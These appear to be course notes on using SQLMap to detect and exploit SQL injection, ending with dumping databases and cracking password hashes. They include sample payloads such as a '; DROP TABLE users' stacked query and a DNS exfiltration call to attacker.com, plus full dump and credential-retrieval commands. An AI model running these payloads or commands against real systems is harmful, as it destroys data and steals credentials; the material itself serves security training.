# SQLMap Overview

SQLMap is an open-source penetration testing tool written in Python designed to automate the detection and exploitation of SQL injection (SQLi) vulnerabilities. It has been continuously developed since 2006 and is still actively maintained.

## Basic Usage

SQLMap can be executed with the following basic command:

```bash
python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'
```

The tool automates tasks like detecting injection points, fingerprinting, enumeration, and exploiting vulnerabilities.

---
## SQLMap Features

- **Target connection testing**
- **Injection detection**
- **Fingerprinting of DBMS**
- **Database content retrieval**
- **OS Command Execution**
- **Bypassing WAF/IPS/IDS using tamper scripts**

## Installation

SQLMap is pre-installed on many security-focused operating systems like Pwnbox. To install on Debian-based systems, use:

```bash
sudo apt install sqlmap
```

To install manually, use:

```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

Run SQLMap with:

```bash
python sqlmap.py
```

## Supported SQL Injection Types

SQLMap can detect and exploit all known SQL injection types. These include:

### 1. **Boolean-based Blind SQL Injection**
- **Example:**
  ```sql
  AND 1=1
  ```
- Relies on TRUE/FALSE results from server responses.

### 2. **Error-based SQL Injection**
- **Example:**
  ```sql
  AND GTID_SUBSET(@@version,0)
  ```
- Uses DBMS errors to retrieve data in "chunks."

### 3. **Union Query-based SQL Injection**
- **Example:**
  ```sql
  UNION ALL SELECT 1,@@version,3
  ```
- Allows extending queries to inject results into the response.

### 4. **Stacked Queries**
- **Example:**
  ```sql
  ; DROP TABLE users
  ```
- Executes multiple queries in a single request (supported on certain DBMS like Microsoft SQL Server).

### 5. **Time-based Blind SQL Injection**
- **Example:**
  ```sql
  AND 1=IF(2>1,SLEEP(5),0)
  ```
- Differentiates between TRUE/FALSE based on response time.

### 6. **Inline Queries**
- **Example:**
  ```sql
  SELECT (SELECT @@version) from
  ```
- Embeds sub-queries in the original query.

### 7. **Out-of-band SQL Injection**
- **Example:**
  ```sql
  LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
  ```
- Uses DNS exfiltration to retrieve data when other methods are slow or unsupported.

## Additional Features

SQLMap includes advanced techniques like:

- **Protection Detection & Bypass**: Using tamper scripts to avoid WAF/IPS/IDS detection.
- **File System Access**: Retrieving files from the server.
- **OS Command Execution**: Running system commands through SQL injection.

---

# Getting Started with SQLMap

## Basic Help Command
```bash
$ sqlmap -h
```
Shows basic usage and common options.

### Common Options:
- `-u URL`: Target URL (e.g., `http://example.com/vuln?id=1`)
- `-v VERBOSE`: Set verbosity (0-6, default 1)
- `-h`: Show help message
- `--version`: Show version

## Advanced Help Command
```bash
$ sqlmap -hh
```
Shows detailed options for configuring targets, requests, and connection methods.

## Example Usage
Test for SQL injection on a target URL:
```bash
sqlmap -u "http://example.com/vuln.php?id=1" --batch
```

- **`--batch`**: Skip user input, use default choices.

## Output Overview:
- **Testing**: SQLMap checks for vulnerabilities in the URL.
- **Injection Points**: Identifies if parameters (like `id`) are vulnerable to SQLi.
- **Payloads**: Tests various SQLi payloads like boolean-based, time-based, or error-based.

---

# SQLMap Output Messages Description

## Common Log Messages

### 1. **Target URL Content is Stable**
   - **Message**: "target URL content is stable"
   - **Meaning**: The response to requests remains consistent, making it easier to spot changes caused by SQLi attempts.

### 2. **Parameter Appears to be Dynamic**
   - **Message**: "GET parameter 'id' appears to be dynamic"
   - **Meaning**: The parameter's value changes with each request, indicating it may interact with a database.

### 3. **Parameter Might be Injectable**
   - **Message**: "heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')"
   - **Meaning**: The parameter shows signs of potential SQL injection, typically identified by DBMS errors.

### 4. **Parameter Vulnerable to XSS**
   - **Message**: "heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks"
   - **Meaning**: SQLMap also checks for XSS vulnerabilities alongside SQLi vulnerabilities.

### 5. **Back-end DBMS Identified**
   - **Message**: "it looks like the back-end DBMS is 'MySQL'."
   - **Meaning**: The target is identified as using MySQL, allowing SQLMap to focus payloads specific to this DBMS.

### 6. **Level/Risk Values**
   - **Message**: "Do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values?"
   - **Meaning**: Option to extend SQLMap's tests for MySQL based on detected risk level.

### 7. **Reflective Values Found**
   - **Message**: "reflective value(s) found and filtering out"
   - **Meaning**: Potential junk found in the response, which SQLMap filters out to ensure accurate results.

### 8. **Injection Point Appears Usable**
   - **Message**: "GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable"
   - **Meaning**: Indicates the parameter is vulnerable to SQL injection, with the specified technique.

### 9. **Time-Based Comparison Model**
   - **Message**: "time-based comparison requires a larger statistical model, please wait"
   - **Meaning**: SQLMap collects response data to recognize delays caused by time-based blind SQLi.

### 10. **Extending UNION Query Tests**
   - **Message**: "automatically extending ranges for UNION query injection technique tests"
   - **Meaning**: SQLMap extends tests if multiple techniques are found, improving the chances of successful UNION SQLi detection.

### 11. **Technique Usability Check**
   - **Message**: "'ORDER BY' technique appears to be usable"
   - **Meaning**: The 'ORDER BY' technique is usable to quickly identify the number of required UNION query columns.

### 12. **Parameter is Vulnerable**
   - **Message**: "GET parameter 'id' is vulnerable."
   - **Meaning**: A key message indicating the parameter is indeed vulnerable to SQL injection.

### 13. **Injection Points Identified**
   - **Message**: "sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests"
   - **Meaning**: SQLMap lists exploitable injection points found in the target URL.

### 14. **Data Logged to Files**
   - **Message**: "fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'"
   - **Meaning**: SQLMap stores session data and output in the specified directory for future use.

---

# Running SQLMap on an HTTP Request

## Introduction
SQLMap allows for extensive customization when targeting HTTP requests for SQL injection testing. Below are key methods to configure and run SQLMap effectively using HTTP requests.

## cURL Command Setup

### Copy as cURL Feature
- **How to use**: Copy the HTTP request from your browser's Developer Tools (e.g., Chrome, Firefox, Edge) and convert it into a SQLMap command.
- **Example**:
  ```bash
  sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
  ```

## GET/POST Requests

### GET Requests
- Use the `-u`/`--url` flag to specify the URL with parameters.
- **Example**:
  ```bash
  sqlmap 'http://www.example.com/?id=1'
  ```

### POST Requests
- Use the `--data` flag to send POST data for testing.
- **Example**:
  ```bash
  sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
  ```

### Targeting Specific Parameters
- Use `-p` to target specific parameters for SQLi testing.
- **Example**:
  ```bash
  sqlmap 'http://www.example.com/' --data 'uid=1&name=test' -p uid
  ```

### Using Asterisk (*) in POST Data
- Mark the parameter to be tested for SQLi with `*` in the data.
- **Example**:
  ```bash
  sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
  ```

## Full HTTP Requests

### Request File (-r)
- Capture the full HTTP request (headers, method, body) using tools like Burp Suite or browser Developer Tools, and save it to a file.
- **Example Request File**:
  ```http
  GET /?id=1 HTTP/1.1
  Host: www.example.com
  User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  ```
- **Running SQLMap with the Request File**:
  ```bash
  sqlmap -r req.txt
  ```

### Custom Injection Mark in Request File
- Mark the parameter for SQLi testing with `*` in the request file (e.g., `/?id=*`).

## Custom SQLMap Requests

### Using Cookies
- Use `--cookie` to specify session cookie values.
- **Example**:
  ```bash
  sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
  ```

### Custom Headers
- Use `-H`/`--header` to add custom HTTP headers.
- **Example**:
  ```bash
  sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
  ```

### Random User-Agent
- Use `--random-agent` to randomize the User-Agent header.
- **Example**:
  ```bash
  sqlmap --random-agent
  ```

### Custom HTTP Methods
- Use `--method` to specify HTTP methods like PUT.
- **Example**:
  ```bash
  sqlmap -u www.target.com --data='id=1' --method PUT
  ```

## Custom HTTP Request Formats

### JSON and XML Requests
- SQLMap can handle POST data in JSON and XML formats. For complex requests, use the `-r` flag with a request file.
  
- **Example JSON Request**:
  ```json
  {
    "data": [{
      "type": "articles",
      "id": "1",
      "attributes": {
        "title": "Example JSON",
        "body": "Just an example"
      }
    }]
  }
  ```
  
- **Running SQLMap with JSON Request**:
  ```bash
  sqlmap -r req.txt
  ```

---

# Handling SQLMap Errors

## Display Errors
Use `--parse-errors` to capture and display any DBMS error messages that occur during the scan. This can help you understand if there are issues with the SQL queries being executed, such as syntax errors or permission issues.

## Store the Traffic
Use `-t` to store all HTTP traffic (requests and responses) in a file. This allows you to manually review the traffic, which can help diagnose issues with how SQLMap is interacting with the target, or if there are any issues in the HTTP request/response process.
```
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
```

## Verbose Output
Use `-v` to increase the verbosity level of SQLMap's output. This will give you more detailed logs about the actions SQLMap is performing, including headers, responses, and debugging information. This is useful for identifying issues during the attack process.

```
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
```

## Using Proxy
Use `--proxy` to route SQLMap's traffic through an external proxy (such as Burp Suite). This allows you to inspect, modify, and replay requests and responses within the proxy, providing deeper insights into the traffic and interactions between SQLMap and the target.

---

# SQLMap Attack Tuning – Short Notes

SQLMap provides various options to fine-tune SQL injection (SQLi) attempts, improving detection and exploiting vulnerabilities. Below are the key options and techniques available:

## 1. **Prefix and Suffix**
   - **Purpose**: Use in special cases where the injection requires specific prefix or suffix formations.
   - **Usage**: 
     - `--prefix="<prefix>" --suffix="<suffix>"`
     - Example: `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"`
   - **Example Query**:
     - Vulnerable code: `SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1`
     - Injection: `SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1`

## 2. **Level and Risk**
   - **Purpose**: Adjust the set of vectors and boundaries used in detection.
   - **Options**:
     - `--level (1-5)`: Defines the depth of vectors and boundaries.
     - `--risk (1-3)`: Modifies the risk level of using more dangerous payloads.
   - **Default**: `--level=1 --risk=1`
   - **Increased Levels**: At `--level=5 --risk=3`, the payloads increase to 7,865.
   - **Verbosity**: Use `-v 3` to view used payloads and boundaries.

## 3. **Advanced Tuning**
   - **Status Codes**:
     - Fixate detection of TRUE responses on specific HTTP codes: `--code=<code>`
     - Example: `--code=200`
   - **Titles**:
     - Compare based on `<title>` tag in the HTML: `--titles`
   - **Strings**:
     - Detect based on a specific string in the response: `--string=<string>`
     - Example: `--string="success"`
   - **Text-only**:
     - Remove HTML tags and compare only visible text: `--text-only`

## 4. **Techniques**
   - **Purpose**: Limit the SQLi techniques used.
   - **Usage**: Use `--technique=<technique>` to specify certain types.
   - **Examples**: 
     - `--technique=BEU` (Boolean-based, Error-based, UNION-based)
     - Skips time-based blind and stacked SQLi payloads.

## 5. **UNION SQLi Tuning**
   - **Purpose**: Fine-tune UNION-based SQLi payloads.
   - **Options**:
     - `--union-cols=<num>`: Manually specify the number of columns for UNION query.
     - `--union-char=<char>`: Replace default dummy value (`NULL`) with a custom character.
     - `--union-from=<table>`: Specify the table for UNION queries (e.g., `--union-from=users`).

## Summary of Key Options:
- **`--prefix`, `--suffix`**: Customize prefix and suffix for specific vulnerabilities.
- **`--level`, `--risk`**: Control the depth and risk of the attack.
- **`--code`, `--titles`, `--string`, `--text-only`**: Fine-tune the detection mechanism.
- **`--technique`**: Specify the type of SQL injection payloads to use.
- **`--union-cols`, `--union-char`, `--union-from`**: Tune UNION-based SQL injection payloads.

## Recommendations:
- **Default Usage**: Regular users should stick with default settings to avoid slowdowns.
- **Advanced Tuning**: Adjust settings for specific vulnerabilities like login pages, complex databases, or unique SQLi cases.

---

# Database Enumeration

## **Overview**
Enumeration is a critical part of an SQL injection (SQLi) attack, occurring after the vulnerability is successfully detected. It involves extracting valuable information from a vulnerable database, which is typically achieved through tools like SQLMap. SQLMap automates the process of SQLi exploitation and data retrieval.

## **SQLMap Data Exfiltration**
SQLMap uses predefined queries for various Database Management Systems (DBMSs). The queries are stored in the `queries.xml` file, with specific commands for each supported DBMS, such as MySQL. Here's an example of the relevant sections for MySQL:

```xml
<root>
    <dbms value="MySQL">
        <cast query="CAST(%s AS NCHAR)"/>
        <length query="CHAR_LENGTH(%s)"/>
        <isnull query="IFNULL(%s,' ')"/>
        <banner query="VERSION()"/>
        <current_user query="CURRENT_USER()"/>
        <current_db query="DATABASE()"/>
        <hostname query="@@HOSTNAME"/>
        ...
    </dbms>
</root>
```

### **Example Queries for MySQL**:
- **Database version**: `VERSION()`
- **Current user**: `CURRENT_USER()`
- **Current database**: `DATABASE()`
- **Hostname**: `@@HOSTNAME`

## **Basic Database Data Enumeration**
Once an SQL injection vulnerability is detected, the enumeration process begins with retrieving basic information such as:
- **Database version** (`--banner`)
- **Current user** (`--current-user`)
- **Current database** (`--current-db`)
- **Checking if the user has DBA privileges** (`--is-dba`)

### Example SQLMap Command for Basic Enumeration:
```bash
$ sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

### **Important Notes**:
- The **root** user in a database context does not necessarily relate to the OS-level root user.
- The **DBA** role typically refers to database administration privileges and not operating system permissions.

## **Table Enumeration**
After identifying the current database, the next step is usually to retrieve the table names using the `--tables` option.

### Example SQLMap Command for Table Enumeration:
```bash
$ sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```

## **Dumping Table Data**
Once a target table is identified, we can dump its data using the `--dump` option.

### Example SQLMap Command for Data Dump:
```bash
$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
```

The data is saved as a CSV file:
```
/home/user/.local/share/sqlmap/output/www.example.com/dump/testdb/users.csv
```

### **Customizing Data Dump**:
1. **Dump Specific Columns**:
   Use `-C` to specify columns:
   ```bash
   $ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
   ```

2. **Limit Rows**:
   Use `--start` and `--stop` to limit the range of rows:
   ```bash
   $ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
   ```

3. **Conditional Enumeration**:
   Retrieve data based on specific conditions using `--where`:
   ```bash
   $ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
   ```
## **Full Database Enumeration**
You can dump all data from a database without specifying individual tables using `--dump -D`.

### Example Command for Full Database Dump:
```bash
$ sqlmap -u "http://www.example.com/?id=1" --dump -D testdb
```

### Dump All Databases:
Use the `--dump-all` option to dump all databases:
```bash
$ sqlmap -u "http://www.example.com/?id=1" --dump-all
```

### **Excluding System Databases**:
System databases are typically not relevant for penetration tests, so the `--exclude-sysdbs` option can be used to skip them:
```bash
$ sqlmap -u "http://www.example.com/?id=1" --dump-all --exclude-sysdbs
```


---

# Advanced Database Enumeration with SQLMap

## **DB Schema Enumeration**
To retrieve the structure of all the tables in a database and get an overview of its architecture, you can use the `--schema` switch. This command retrieves information on each database, its tables, and the associated column details.

### Example Command:
```bash
$ sqlmap -u "http://www.example.com/?id=1" --schema
```

## **Searching for Data**
When dealing with large databases with numerous tables and columns, the `--search` option can be used to search for specific names or keywords within tables and columns.

### Searching for Tables:
To search for tables containing a specific keyword, use:
```bash
$ sqlmap -u "http://www.example.com/?id=1" --search -T user
```

### Searching for Columns:
To search for columns containing a specific keyword (e.g., `pass`), use:
```bash
$ sqlmap -u "http://www.example.com/?id=1" --search -C pass
```

### Sample Output:
- **Table search for 'user':**
  - Database: testdb - Table: users
  - Database: mysql - Table: user

- **Column search for 'pass':**
  - Database: owasp10 - Table: accounts (password)
  - Database: master - Table: users (password)

## **Password Enumeration and Cracking**
When a table with passwords is identified (e.g., a `password` column), SQLMap can retrieve and attempt to crack password hashes using a dictionary-based attack.

### Example Command:
```bash
$ sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
```

### Hash Cracking:
- If SQLMap detects password hashes, it prompts the user to attempt cracking them using a dictionary file.
- It supports over 30 hash types and can use a default dictionary with over 1.4 million entries.

## **DB Users Password Enumeration and Cracking**
SQLMap can also retrieve password hashes from system tables, such as those containing database-specific credentials, with the `--passwords` switch.

### Example Command:
```bash
$ sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```


### Tip:
You can use the `--all` and `--batch` switches together to automatically enumerate and dump all available data from the database.

---

